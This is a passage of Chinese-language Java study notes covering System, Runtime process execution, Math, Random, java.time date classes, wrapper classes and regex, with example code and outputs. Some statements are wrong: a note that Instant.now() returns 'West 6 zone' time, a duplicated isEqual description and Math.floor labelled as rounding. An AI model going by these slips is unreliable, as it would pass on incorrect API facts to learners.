System.getProperty(key);\n\t\t\tSystem.out.println(key + \"---&gt;\" + value);\n\t\t}\n\t}\n}\r\n\r\ngc()方法\r\n通知Java虚拟机立即进行垃圾回收。\r\n当一个对象在内存中被释放时，它的finalize()方法会被自动调用，因此可以在类中通过定义finalize()方法观察对象何时被释放\r\nclass Person {\n\t//下面定义的finalize方法会在垃圾回收前被调用\n\tpublic void finalize() {\n\t\tSystem.out.println(\"对象将被作为垃圾回收...\");\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\t//下面创建了两个Person对象\n\t\tPerson p1 = new Person();\n\t\tPerson p2 = new Person();\n\t\t//下面将变量置为null，让对象成为垃圾\n\t\tp1 = null;\n\t\tp2 = null;\n\t\t//调用方法进行垃圾回收\n\t\tSystem.gc();\n\t\tfor(int i = 0; i &lt; 1000000; i++) {\n\t\t\t//为了延长程序运行的时间\n\t\t}\n\t}\n}\r\nexit(int status)\r\n该方法用于终止当前正在运行的Java虚拟机，其中参数status用于表示当前发生的异常状态，通常指定为0，表示正常退出，否则表示异常终止\r\n\r\nRuntime类\r\n用于表示虚拟机运行时的状态，它用于封装Java虚拟机进程\r\n每次使用Java命令启动虚拟机都对应一个Runtime实例，并且只有一个实例，因此在定义Runtime类的时候，它的构造方法已经被私有化了（单例设计模式的应用），同时的对象不可以直接实例化\r\n在程序中获得一个Runtime实例的方式：\r\nRuntime run = Runtime.getRuntime();\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\ngetRuntime()\r\n该方法用于返回当前应用程序的运行环境对象\r\n\r\n\r\nexec(String command)\r\n该方法用于根据指定的路径执行对应的可执行文件\r\n\r\n\r\nfreeMemory()\r\n该方法用于返回Java虚拟机中的空闲内存量，以字节为单位\r\n\r\n\r\nmaxMemory()\r\n该方法用于返回Java虚拟机的最大可用内存量\r\n\r\n\r\navailableProcessors()\r\n该方法用于返回当前虚拟机的处理器个数\r\n\r\n\r\ntotalMemory()\r\n该方法用于返回Java虚拟机的内存总量\r\n\r\n\r\n\r\n\r\n获取当前虚拟机信息\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tRuntime rt = Runtime.getRuntime();\t//获取\n\t\tSystem.out.println(\"处理器的个数：\" + rt.availableProcessors() + \"个\");\n\t\tSystem.out.println(\"空闲内存数量：\" + rt.freeMemory()/1024/1024 + \"M\");\n\t\tSystem.out.println(\"最大可用内存数量：\" + rt.maxMemory()/1024/1024 + \"M\");\n\t\tSystem.out.println(\"虚拟机中内存总量：\" + rt.totalMemory()/1024/1024 + \"M\");\n\t}\n}\n\n输出结果：\n处理器的个数：16个\n空闲内存数量：215M\n最大可用内存数量：3548M\n虚拟机中内存总量：222M\r\n\r\n注意：空闲内存数、可用最大内存数和内存总量都是以字节为单位计算的，字节/1024/1024可以换算为兆（M）\r\n\r\n操作系统进程\r\nRuntime类中提供了一个exec()方法，该方法用于执行一个DOS命令，从而实现与在命令行窗口中输入dos命令同样的效果\r\nimport java.io.IOException;\npublic class test {\n\tpublic static void main(String[] args) throws IOException {\n\t\tRuntime rt = Runtime.getRuntime();\t//创建Runtime实例对象\n\t\trt.exec(\"notepad.exe\");\t//调用exec()方法,通过运行\"notepad.exe\"命令打开一个Windows自带的记事本程序\n\t}\n}\r\n查阅API文档会发现，Runtime类的exec()方法返回一个Process对象，该对象就是exec()所生成的新进程，通过该对象可以对产生的新进程进行管理\r\npublic class test {\n\tpublic static void main(String[] args) throws Exception {\n\t\tRuntime rt = Runtime.getRuntime();\t//创建Runtime实例对象\n\t\tProcess process = rt.exec(\"notepad.exe\");\t//得到表示进程的Process对象\n\t\tThread.sleep(10000);\t//程序休眠10秒\n\t\tprocess.destroy();\t//杀掉进程\n\t}\n}\r\n\r\nMath类与Random类\r\nMath类\r\n提供了大量的静态方法以便进行数学计算\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\nabs(double a)\r\n用于计算a的绝对值\r\n\r\n\r\nsqrt(double a)\r\n用于计算a的方根\r\n\r\n\r\nceil(double a)\r\n用于计算大于等于a的最小整数，并将该整数转化为double型数据\r\n\r\n\r\nfloor(double a)\r\n用于计算小于等于a的最大整数，并将该整数转化为double型数据\r\n\r\n\r\nround(double a)\r\n用于计算小数a进行四舍五入后的值\r\n\r\n\r\nmax(double a, double b)\r\n用于返回a和b的较大值\r\n\r\n\r\nmin(double a, double b)\r\n用于返回a和b的较小值\r\n\r\n\r\nrandom()\r\n用于生成一个大于0.0小于1.0的随机值（包括0不包括1）\r\n\r\n\r\npow(double a, double b)\r\n用于计算a的b次幂，即a^b值\r\n\r\n\r\n\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tSystem.out.println(\"计算-10的绝对值：\" + Math.abs(-10));\n\t\tSystem.out.println(\"求大于5.6的最小整数：\" + Math.ceil(5.6));\n\t\tSystem.out.println(\"对-4.2进行四舍五入：\" + Math.floor(-4.2));\n\t\tSystem.out.println(\"求2.1和-2.1中的较大值：\" + Math.max(2.1, -2.1));\n\t\tSystem.out.println(\"求2.1和-2.1中的较小值：\" + Math.min(2.1, -2.1));\n\t\tSystem.out.println(\"生成一个大于等于0.0小于1.0随机值：\" + Math.random());\n\t\tSystem.out.println(\"计算4的开平方的结果：\" + Math.sqrt(4));\n\t\tSystem.out.println(\"计算指数函数2的3次方的值：\" + Math.pow(2, 3));\n\t}\n}\n\n输出结果：\n计算-10的绝对值：10\n求大于5.6的最小整数：6.0\n对-4.2进行四舍五入：-5.0\n求2.1和-2.1中的较大值：2.1\n求2.1和-2.1中的较小值：-2.1\n生成一个大于等于0.0小于1.0随机值：0.3304815142845955\n计算4的开平方的结果：2.0\n计算指数函数2的3次方的值：8.0\r\nRandoom类\r\nJava的java.util包中有一个Random类它可以在指定的取值范围内随机产生数字。\r\n提供了2种构造方法：\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\nRandom()\r\n构造方法，用于创建一个伪随机数选择选择器\r\n\r\n\r\nRandom(long seed)\r\n构造方法，使用一个long型的seed（种子）创建伪随机数选择器\r\n\r\n\r\n\r\n\r\n没有指定种子，系统会以当前时间戳作为种子来产生随机数,\r\n运行两次产生的随机数序列是不一样的\r\nimport java.util.Random;\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tRandom r = new Random();\t//不传入种子\n\t\t//随机产生10个[0,100)之间的整数\n\t\tfor(int x = 0; x &lt; 10; x++) {\n\t\t\tSystem.out.println(r.nextInt(100));\n\t\t}\n\t}\n}\r\n指定了相同的种子，则每个实例对象产生的随机数具有相同的序列\r\nimport java.util.Random;\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tRandom r = new Random(13);\t//传入种子\n\t\t//随机产生10个[0,100)之间的整数\n\t\tfor(int x = 0; x &lt; 10; x++) {\n\t\t\tSystem.out.println(r.nextInt(100));\n\t\t}\n\t}\n}\r\n\r\n相对于Math的random()方法而言，Random类提供了更多的方法来生成各种伪随机数，不仅可以生成整数类型的随机数，而且可以生成浮点类型的随机数\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\ndouble nextDouble()\r\n生成double类型的随机数\r\n\r\n\r\nfloat nextFloat()\r\n生成float类型的随机数\r\n\r\n\r\nint nextInt()\r\n生成int类型的随机数\r\n\r\n\r\nint nextInt(int n)\r\n生成[0,n)\r\nint类型的随机数\r\n\r\n\r\n\r\nimport java.util.Random;\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tRandom r1 = new Random();\t//创建Random实例\n\t\tSystem.out.println(\"产生float类型的随机数：\" + r1.nextFloat());\n\t\tSystem.out.println(\"产生double类型的随机数：\" + r1.nextDouble());\n\t\tSystem.out.println(\"产生int类型的随机数：\" + r1.nextInt());\n\t\tSystem.out.println(\"产生0~100之间int类型的随机数：\" + r1.nextInt(100));\n\t}\n}\r\n时间日期类\r\n在开发种经常需要处理日期和时间，Java提供了一套专门用于处理时间的API，这些类都包含在java.time包中。\r\n表示日期的主要类：\r\n\r\n\r\n\r\n类的名称\r\n功能描述\r\n\r\n\r\n\r\n\r\nInstant\r\n表示时刻，代表的是时间戳\r\n\r\n\r\nLocalDate\r\n不包含具体时间的日期\r\n\r\n\r\nLocalTime\r\n不包含日期的时间\r\n\r\n\r\nLocalDateTime\r\n包含了日期和时间\r\n\r\n\r\nDuration\r\n基于时间的值测量时间量\r\n\r\n\r\nPeriod\r\n计算日时间差异，只能精确到年月日\r\n\r\n\r\nClock\r\n时钟系统，用于查找当前时刻\r\n\r\n\r\n\r\nInstant类\r\nInstant类表示的是某个时间\r\n其内部由两个Long字段组成，第一部分保存的是标准Java计算时代（1970年1月1日开始）到现在的秒数，第二部分保存的是纳秒数\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\nnow()\r\n从系统时钟获取当前时刻\r\n\r\n\r\nnow(Clock clock)\r\n从指定时钟获取当前时刻\r\n\r\n\r\nofEpochSecond(long epochSecond)\r\n从自标准Java计算时代开始的秒数获得一起Instant的实例\r\n\r\n\r\nofEpochMilli(long epochMilli)\r\n从自标准Java计算时代开始的毫秒数获得一起Instant的实例\r\n\r\n\r\ngetEpochSecond()\r\n从1970-01-01T00:00:00Z的标准Java计算时代获取秒数\r\n\r\n\r\ngetNano()\r\n从第二秒开始表示的时间线中返回纳秒数\r\n\r\n\r\nparse(CharSequence text)\r\n从一个文本字符串（如2007-10-03T10:15:30.00Z）获取一个Instant的实例\r\n\r\n\r\nfrom(TemporalAccessor tenporal)\r\n从时间对象获取一个Instant实例\r\n\r\n\r\n\r\nimport java.time.Instant;\npublic class test {\n\tpublic static void main(String[] args) {\n\t\t//Instant时间戳类从1970-01-01 00：00：00截止到当前时间的毫秒值\n\t\tInstant now = Instant.now();\n\t\tSystem.out.println(\"从系统获取的当前时刻为：\" + now);\n\t\tInstant instant = Instant.ofEpochMilli(10001*60*64*24);\n\t\tSystem.out.println(\"计算机元年增加毫秒数后为：\" + instant);\n\t\tInstant instant1 = Instant.ofEpochSecond(60*60*24);\n\t\tSystem.out.println(\"计算机元年增加秒数后为：\" + instant1);\n\t\tSystem.out.println(\"获取的秒值为：\" + Instant.parse(\"2007-10-03T10:15:30.44Z\").getEpochSecond());\n\t\tSystem.out.println(\"获取的纳秒值为：\" + Instant.parse(\"2007-10-03T10:15:30.44Z\").getNano());\n\t\tSystem.out.println(\"从时间对象获取的Instant实例为：\" + Instant.from(now));\n\t}\n}\n\n输出结果：\n从系统获取的当前时刻为：2023-08-12T03:01:19.485038400Z\n计算机元年增加毫秒数后为：1970-01-02T01:36:00Z\n计算机元年增加秒数后为：1970-01-02T00:00:00Z\n获取的秒值为：1191406530\n获取的纳秒值为：440000000\n从时间对象获取的Instant实例为：2023-08-12T03:01:19.485038400Z\r\n\r\n注意：\r\n当前北京时间为2023-08-12T13:01:19.485038400Z相差8个小时\r\n北京位于东八区，从系统中获取的时间为0时区的时间\r\nnow()方法默认获取的是西六区时间\r\nparse()是从文本字符串获取的Instant实例\r\n\r\nLocalDate类\r\n仅用来表示日期（通常是年份和月份）\r\n该类不能代表时间线上的即时信息，只是日期的描述\r\n//从一年、一个月和一天获得一个LocalDate的实例\nLocalDate date = LocalDate.of(2020, 12, 12);\n//从默认时区的系统时钟获取当前日期\nLocalDate now1 = LocalDate.now();\r\n一些常用方法\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\ngetYear()\r\n获取年份字段\r\n\r\n\r\ngetMonth()\r\n使用Month枚举获取月份字段\r\n\r\n\r\ngetMonthValue()\r\n获取月份字段，从1~12\r\n\r\n\r\ngetDayOfMonth()\r\n获取当月第几天字段\r\n\r\n\r\nformat(DateTimeFormatter formatter)\r\n使用指定的格式化程序格式化此日期\r\n\r\n\r\nisBefore(ChronoLocalDate other)\r\n检查此日期是否在指定日期之前\r\n\r\n\r\nisAfter(ChronoLocalDate other)\r\n检查此日期是否在指定日期之后\r\n\r\n\r\nisEqual(ChoroLocalDate other)\r\n检查此日期是否在指定日期之后\r\n\r\n\r\nisLeapYear()\r\n根据ISO培训日历系统规则，检查年份是否是闰年\r\n\r\n\r\nparse(CharSequence text)\r\n从一个文本字符串中获取一个LocalDate的实例\r\n\r\n\r\nparse(CharSequence text, DateTimeFormatter formatter)\r\n使用特定格式化LocalDate从文本字符串获取LocalDate的实例\r\n\r\n\r\nplusYears(long yearsToAdd)\r\n增加指定年份\r\n\r\n\r\nplusMonths(long monthsToAdd)\r\n增加指定月份\r\n\r\n\r\nplusDays(long daysToAdd)\r\n增加指定日数\r\n\r\n\r\nminusYears(long yearsToSubtract)\r\n减少指定年份\r\n\r\n\r\nminusMonths(long monthsToSubtract)\r\n减少指定月份\r\n\r\n\r\nminusDays(long daysToSubtract)\r\n减少指定日数\r\n\r\n\r\nwithYear(int year)\r\n指定年\r\n\r\n\r\nwithMonth(int month)\r\n指定月\r\n\r\n\r\nwithDayOfYear(int dayOfYear)\r\n指定日\r\n\r\n\r\n\r\nimport java.time.LocalDate;\nimport java.time.format.DateTimeFormatter;\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\t//获取日期和时间\n\t\tLocalDate now = LocalDate.now();\n\t\tLocalDate of = LocalDate.of(2015, 12, 12);\n\t\tSystem.out.println(\"1.LocalDate的获取及格式化的相关方法---------\");\n\t\tSystem.out.println(\"从LocalDate实例获取的年份为：\" + now.getYear());\n\t\tSystem.out.println(\"从LocalDate实例获取的月份：\" + now.getMonthValue());\n\t\tSystem.out.println(\"从LocalDate实例获取当天在本月的第几天：\" + \n\t\tnow.getDayOfMonth());\n\t\tSystem.out.println(\"将获取到的LocalDate实例格式化为：\" +\n\t\tnow.format(DateTimeFormatter.ofPattern(\"yyyy年MM月dd日\")));\n\t\tSystem.out.println(\"2.LocalDate判断的相关方法----------------\");\n\t\tSystem.out.println(\"判断日期of是否在now之前：\" + of.isBefore(now));\n\t\tSystem.out.println(\"判断日期of是否在now之后：\" + of.isAfter(now));\n\t\tSystem.out.println(\"判断日期of和now是否相等\" + now.equals(of));\n\t\tSystem.out.println(\"判断of是否是闰年：\" + of.isLeapYear());\n\t\t//给出一个符合默认格式要求的日期字符串\n\t\tSystem.out.println(\"3.LocalDate解析以及加减操作的相关方法--------\");\n\t\tString dateStr = \"2020-02-01\";\n\t\tSystem.out.println(\"把日期字符串解析成日期对象后为\" + LocalDate.parse(dateStr));\n\t\tSystem.out.println(\"将LocalDate实例年份加1为：\" + now.plusYears(1));\n\t\tSystem.out.println(\"将LocalDate实例天数减10为：\" + now.minusDays(10));\n\t\tSystem.out.println(\"将LocalDate实例指定年份为2014：\" + now.withYear(2014));\n\t}\n}\n\n输出结果：\n1.LocalDate的获取及格式化的相关方法---------\n从LocalDate实例获取的年份为：2023\n从LocalDate实例获取的月份：8\n从LocalDate实例获取当天在本月的第几天：14\n将获取到的LocalDate实例格式化为：2023年08月14日\n2.LocalDate判断的相关方法----------------\n判断日期of是否在now之前：true\n判断日期of是否在now之后：false\n判断日期of和now是否相等false\n判断of是否是闰年：false\n3.LocalDate解析以及加减操作的相关方法--------\n把日期字符串解析成日期对象后为2020-02-01\n将LocalDate实例年份加1为：2024-08-14\n将LocalDate实例天数减10为：2023-08-04\n将LocalDate实例指定年份为2014：2014-08-14\r\n\r\n日期格式化：\r\n书本上的代码为：\r\nSystem.out.println(\"将获取到的LocalDate实例格式化为：\" + now.format(DateTimeFormatter.ofPattern(\"yyyy年mm月dd日\")));\r\n\r\n后面的显示出不来，修改代码为：\r\nSystem.out.println(\"将获取到的LocalDate实例格式化为：\" + now.format(DateTimeFormatter.ofPattern(\"yyyy年MM月dd日\")));\r\n\r\n\r\ny：年份（年的表示会根据实际位数进行显示，如yy表示两位数的年，yyyy表示四位数的年）。\r\nM：月份（大写M表示大写月份，小写m表示分钟）。\r\nd：月中的天数。\r\nD：年中的天数（一年中的第几天）。\r\nE：星期几的缩写名称（如Mon、Tue等）。\r\na：上午/下午标记。\r\nH：一天中的小时数（24小时制）。\r\nh：一天中的小时数（12小时制）。\r\nm：分钟数。\r\ns：秒数。\r\nS：毫秒数。\r\n\r\n\r\nLocalTime类与LocalDateTime类\r\n\r\nLocalTime类用来表示时间，通常表示的是小时、分钟、秒。\r\nimport java.time.LocalTime;\nimport java.time.format.DateTimeFormatter;\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\t//获取当前时间，包含毫秒数\n\t\tLocalTime time = LocalTime.now();\n\t\tLocalTime of = LocalTime.of(9, 23, 23);\n\t\tSystem.out.println(\"从LocalTime获取的小时为：\" + time.getHour());\n\t\tSystem.out.println(\"将获取到的LocalTime实例格式化为：\" + \n\t\ttime.format(DateTimeFormatter.ofPattern(\"HH:mm:ss\" )));\n\t\tSystem.out.println(\"判断时间of是否在now之前：\" + of.isBefore(time));\n\t\tSystem.out.println(\"将时间字符串解析为时间对象后为：\" + \n\t\tLocalTime.parse(\"12:15:30\"));\n\t\tSystem.out.println(\"从LocalTime获取当前时间，不包含毫秒数：\" + \n\t\ttime.withNano(0));\n\t}\n}\n\n输出结果：\n从LocalTime获取的小时为：13\n将获取到的LocalTime实例格式化为：13:58:27\n判断时间of是否在now之前：true\n将时间字符串解析为时间对象后为：12:15:30\n从LocalTime获取当前时间，不包含毫秒数：13:58:27\r\nLocalDateTime类是LocalDate类与LocalTime类的综合，它既包含日期，也包含时间。\r\nimport java.time.LocalDateTime;\nimport java.time.format.DateTimeFormatter;\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\t//获取当前时间，包括秒数\n\t\tLocalDateTime now = LocalDateTime.now();\n\t\tSystem.out.println(\"获取的当前日期时间为：\" + now);\n\t\tSystem.out.println(\"将目标LocalDateTime转换为相应的LocalDate实例：\" + \n\t\tnow.toLocalDate());\n\t\tSystem.out.println(\"将目标LocalDateTime转换为相应的LocalTime实例：\" + \n\t\tnow.toLocalTime());\n\t\t//指定格式\n\t\tDateTimeFormatter ofPattern = DateTimeFormatter.ofPattern\n\t\t(\"yyyy年MM月dd日hh时mm分ss秒\");\n\t\tSystem.out.println(\"格式化后的日期时间为：\" + now.format(ofPattern));\n\t}\n}\n\n输出结果：\n获取的当前日期时间为：2023-08-14T14:44:26.574817500\n将目标LocalDateTime转换为相应的LocalDate实例：2023-08-14\n将目标LocalDateTime转换为相应的LocalTime实例：14:44:26.574817500\n格式化后的日期时间为：2023年08月14日02时44分26秒\r\n\r\n注意：\r\nLocaldate默认的格式是2020-02-29T20:23:26.774，但与人们经常使用的格式不太符合，所以它经常与DateTimeFormatter一起使用指定格式\r\n除了LocalDate与LocalTime类中使用的方法外，还额外提供了转换方法\r\n\r\n\r\nPeriod和Duration类\r\n为开发提供了简单的时间计算方法\r\nDuration类\r\n基于时间值，作用范围是天、时、分、秒、毫秒和纳秒\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\nbetween(Temporal startInclusive, Temporal end Exclusive)\r\n获取一个Duration表示两个时间对象之间的持续时间\r\n\r\n\r\ntoDays()\r\n将时间转换为以天为单位\r\n\r\n\r\ntoHours()\r\n将时间转换为以小时为单位\r\n\r\n\r\ntoMinutes()\r\n将时间转换为以分钟时为单位\r\n\r\n\r\ntoMillis()\r\n将时间转换为以毫秒为单位\r\n\r\n\r\ntoNanos()\r\n将时间转换为以纳秒为单位\r\n\r\n\r\n\r\nimport java.time.Duration;\nimport java.time.LocalTime;\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tLocalTime start = LocalTime.now();\n\t\tLocalTime end = LocalTime.of(16, 8, 1);\t//of(时, 分, 秒)\n\t\tDuration duration = Duration.between(start, end);\n\t\t//间隔的时间\n\t\tSystem.out.println(\"时间间隔为：\" + duration.toNanos() + \"纳秒\");\n\t\tSystem.out.println(\"时间间隔为：\" + duration.toMillis() + \"毫秒\");\n\t\tSystem.out.println(\"时间间隔为：\" + duration.toHours() + \"小时\");\n\t}\n}\r\nPeriod类\r\n用于计算两个日期的间隔，与Duration相同，也是通过between计算日期间隔，并提供了获取年月日的3个常用方法，分别是getYears()、getMonths()和getDays()、\r\nimport java.time.LocalDate;\nimport java.time.Period;\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tLocalDate birthday = LocalDate.of(2024, 3, 15);\n\t\tLocalDate now = LocalDate.now();\n\t\t//计算两个日期的间隔\n\t\tPeriod between = Period.between(now, birthday);\n\t\tSystem.out.println(\"时间间隔为\" + between.getYears() + \"年\");\n\t\tSystem.out.println(\"时间间隔为\" + between.getMonths() + \"月\");\n\t\tSystem.out.println(\"时间间隔为\" + between.getDays() + \"天\");\n\t}\n}\r\n包装类\r\n在Java中，不能把基本的数据类型作为对象来处理，而在某些场合可能需要把基本数据类型的数据作为对象来使用\r\n包装类可以把基本数据类型的值包装为引用数据类型的对象\r\n\r\n\r\n\r\n基本数据类型\r\n对应的包装类\r\n\r\n\r\n\r\n\r\nbyte\r\nByte\r\n\r\n\r\nchar\r\nCharacter\r\n\r\n\r\nint\r\nInteger\r\n\r\n\r\nshort\r\nShort\r\n\r\n\r\nlong\r\nLong\r\n\r\n\r\nfloat\r\nFloat\r\n\r\n\r\ndouble\r\nDouble\r\n\r\n\r\nboolean\r\nBoolean\r\n\r\n\r\n\r\n包装类和基本数据类型在进行转换时，引入了装箱和拆箱的概念：\r\n\r\n装箱：将基本数据类型的值转换为引用数据类型\r\n拆箱：将引用数据类型的对象转换为基本数据类型\r\n\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tint a = 20;\n\t\tInteger in = a;\t//自动装箱\n\t\tSystem.out.println(in);\n\t\tint i = in;\t//自动拆箱\n\t\tSystem.out.println(i);\n\t}\n}\n\n输出结果：\n20\n20\r\n通过查看API可以知道，Integer除了具有Object类的所以方法外，还有一些特殊方法\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\nInteger valueOf(int i)\r\n返回一个表示指定的int值的Integer实例\r\n\r\n\r\nInteger valueOf(String s)\r\n返回保存指定的String值的Integer对象\r\n\r\n\r\nint parseInt(String s)\r\n将字符串参数作为有符号的十进制整数进行解析（字符串--&gt;int）\r\n\r\n\r\nintValue()\r\n将Integer类型的值以int类型返回(手动拆箱)\r\n\r\n\r\n\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tInteger num = new Integer(20);\t//手动装箱\n\t\tint sum = num.intValue() + 10;\t//手动拆箱\n\t\tSystem.out.println(\"将Integer类型的值转换为int类型后与10求和为：\" + sum);\n\t\tSystem.out.println(\"返回表示10的Integer实例为：\" + Integer.valueOf(10));\n\t\tint w = Integer.parseInt(\"20\") + 32;\n\t\tSystem.out.println(\"将字符串转换为整数为：\" + w);\n\t}\n}\n\n输出结果：\n将Integer类型的值转换为int类型后与10求和为：30\n返回表示10的Integer实例为：10\n将字符串转换为整数为：52\r\n\r\n注意：\r\n\r\n包装类都重写了Object类中的toString()方法，以字符串的形式返回被包装的基本数据类型的值\r\n除了Character外，包装类都有valueOf(String s)方法，可以根据String类型的参数创建包装类对象，但参数字符串s不能为null，而且字符串必须是可以解析为相应基本类型的数据，否则虽然编译通过，但运行时会报错。\r\nInteger i = Integer.valueOf(\"123\");\t//合法\nInteger i = Integer.valueOf(\"12a\");\t//不合法\r\n除了Character外，包装类都有parseXxx(String s)的静态方法，将字符串转换为对应的基本类型的数据。参数s不能为null，而且字符串必须是可以解析为相应基本类型的数据，否则虽然编译通过，但运行时会报错。\r\nint i = Integer.parseInt(\"123\");\t//合法\nint in = Integer.parseInt(\"itcast\");\t//不合法\r\n\r\n\r\n正则表达式\r\n在程序开发中，会对一些字符串做各种限制（例如长度或格式等限定），而这些限制就是用正则表达式实现的\r\n正则表达式就是由普通字符（如字符a-z）和特殊字符（元字符）组成的文字模式\r\n元字符\r\n元字符是指那些在正则表达式中具有特殊意义的专用字符，可以用来规定其前导字符（即位于元字符前面的字符）在目标对象中的出现模式\r\n\r\n\r\n\r\n元字符\r\n功能描述\r\n\r\n\r\n\r\n\r\n\\\r\n转义字符，例如\\n匹配\\n（换行）\r\n\r\n\r\n^\r\n正则表达式的开头标志\r\n\r\n\r\n$\r\n正则表达式的结尾标志\r\n\r\n\r\n*\r\n匹配零次或多次\r\n\r\n\r\n+\r\n匹配一次或多次\r\n\r\n\r\n?\r\n匹配一次或零次\r\n\r\n\r\n.\r\n匹配任意字符\r\n\r\n\r\n{n}\r\n匹配n次\r\n\r\n\r\n{n,}\r\n至少匹配n次\r\n\r\n\r\n{n,m}\r\nn&lt;=m，至少匹配n次，最多匹配m次\r\n\r\n\r\nx|y|\r\n匹配x或y\r\n\r\n\r\n[xyz]\r\n字符集合，匹配所包含的任意一个字符\r\n\r\n\r\n[a-z]\r\n字符范围，匹配指定范围内的任意字符\r\n\r\n\r\n[^a-z]\r\n负值字符范围，匹配任何不在指定范围内的字符\r\n\r\n\r\n[a-zA-Z]\r\n匹配a-z到A-Z\r\n\r\n\r\n\\d\r\n匹配数字0~9\r\n\r\n\r\n\\D\r\n匹配非数字字符\r\n\r\n\r\n\\s\r\n匹配空白字符\r\n\r\n\r\n\\S\r\n匹配非空白字符\r\n\r\n\r\n\\w\r\n匹配单词字符与数字0~9\r\n\r\n\r\n\\b\r\n单词边界\r\n\r\n\r\n\\B\r\n非单词边界\r\n\r\n\r\n\\A\r\n输入的开头\r\n\r\n\r\n\\G\r\n上一个匹配的结尾\r\n\r\n\r\n\\Z\r\n输入的结尾，仅用于最后的结束字符（如果由的话）\r\n\r\n\r\n\\z\r\n输入的结尾\r\n\r\n\r\n\r\nPattern类和Matcher类\r\nJava正则表达式通过java.util.regex包下的Pattern类与Matcher类实现\r\nPattern类\r\n用来创建一个正则表达式，它的构造方法是私有的，不可以直接创建，但可以通过Pattern.compile(String regex)简单工厂方法创建一个正则表达式：\r\nPattern p = Pattern.compile(\"\\\\w+\");\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\nsplit(CharSequence input)\r\n将给定的输入序列分成这个模式的匹配\r\n\r\n\r\nMatcher matcher(charSequence input)\r\n提供了对正则表达式的分组支持，以及对正则表达式的多次匹配支持\r\n\r\n\r\nStatic boolean matches(String regex, CharSequence input)\r\n编译给定的正则表达式，并尝试匹配给定的输入\r\n\r\n\r\n\r\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tPattern p = Pattern.compile(\"\\\\d+\");\n\t\tString[] str = p.split(\"我的QQ是：456456 我的电话是：0532214 \" + \n\t\t\"我的邮箱是：aaa@aaa.com\");\t//通过split()方法将字符串按照给定的模式进行分割，返回数组str\n\t\tSystem.out.println(\"是否匹配Pattern的输入模式\" + \n\t\t\t\tPattern.matches(\"\\\\d+\", \"2223\"));\n\t\tSystem.out.println(\"是否匹配Pattern的输入模式\" + \n\t\t\t\tPattern.matches(\"\\\\d+\", \"2223aa\"));\n\t\tMatcher m = p.matcher(\"22bb23\");\n\t\tSystem.out.println(\"返回该Matcher对象是由哪个Pattern对象创建的，即为：\" + \n\t\tm.pattern());\n\t\tSystem.out.print(\"将给定的字符串分割成Pattern模式匹配为：\");\n\t\tfor(int i = 0; i &lt; str.length; i++) {\n\t\t\tSystem.out.print(str[i] + \" \");\n\t\t}\n\t}\n}\n\n输出结果：\n是否匹配Pattern的输入模式true\n是否匹配Pattern的输入模式false\n返回该Matcher对象是由哪个Pattern对象创建的，即为：\\d+\n将给定的字符串分割成Pattern模式匹配为：我的QQ是：  我的电话是：  我的邮箱是：aaa@aaa.com \r\nMatcher类\r\n用于给定的Pattern实例的模式控制下进行字符串的匹配工作，同理，Matcher的构造方法也是私有的，不能直接创建，只能通过Pattern.matcher(CharSequence input)方法得到该类的实例\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\nboolean matches()\r\n对整个字符串进行匹配，只有整个字符串都匹配才返回true\r\n\r\n\r\nboolean lookingAt()\r\n对前面的字符串进行匹配，只有匹配到的字符串在最前面才返回true\r\n\r\n\r\nboolean find()\r\n对字符串进行匹配，匹配到的字符串可以在任何位置\r\n\r\n\r\nint end()\r\n返回最后一个字符匹配后的偏移量\r\n\r\n\r\nstring group()\r\n返回匹配到的子字符串\r\n\r\n\r\nint start()\r\n返回匹配到的子字符串中的索引位置\r\n\r\n\r\n\r\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tPattern p = Pattern.compile(\"\\\\d+\");\n\t\tMatcher m = p.matcher(\"22bb23\");\n\t\tSystem.out.println(\"字符串是否匹配：\" + m.matches());\n\t\tMatcher m2 = p.matcher(\"2223\");\n\t\tSystem.out.println(\"字符串是否匹配：\" + m2.matches());\n\t\tSystem.out.println(\"对前面的字符串匹配结果为\" + m.lookingAt());\n\t\tMatcher m3 = p.matcher(\"aa2223\");\n\t\tSystem.out.println(\"对前面的字符串匹配结果为：\" + m3.lookingAt());\n\t\tm.find();\t//返回true\n\t\tSystem.out.println(\"字符串任何位置是否匹配：\" + m.find());\n\t\tm3.find();\t//返回true\n\t\tSystem.out.println(\"字符串任何位置是否匹配：\" + m3.find());\n\t\tMatcher m4 = p.matcher(\"aabb\");\n\t\tSystem.out.println(\"字符串任何位置是否匹配：\" + m4.find());\n\t\tMatcher m1 = 